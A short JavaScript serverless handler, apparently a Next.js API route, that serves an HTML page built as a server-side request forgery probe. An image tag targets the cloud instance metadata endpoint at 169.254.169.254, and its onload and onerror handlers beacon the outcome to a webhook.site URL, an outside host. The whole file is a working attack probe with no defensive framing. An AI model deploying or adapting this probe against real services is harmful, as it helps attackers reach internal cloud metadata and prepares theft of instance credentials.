export default function handler(req, res) {
  res.setHeader('Content-Type', 'text/html');
  res.status(200).send(`
    <html>
      <body>
        <h1>Testing...</h1>
        <img src="http://169.254.169.254/computeMetadata/v1/instance/hostname?v=${Date.now()}" 
             onerror="fetch('https://webhook.site/0a66617e-3159-4804-9229-84d7010ec66d?status=HIT_BUT_ERROR');"
             onload="fetch('https://webhook.site/0a66617e-3159-4804-9229-84d7010ec66d?status=IMAGE_LOADED');">
      </body>
    </html>
  `);
}
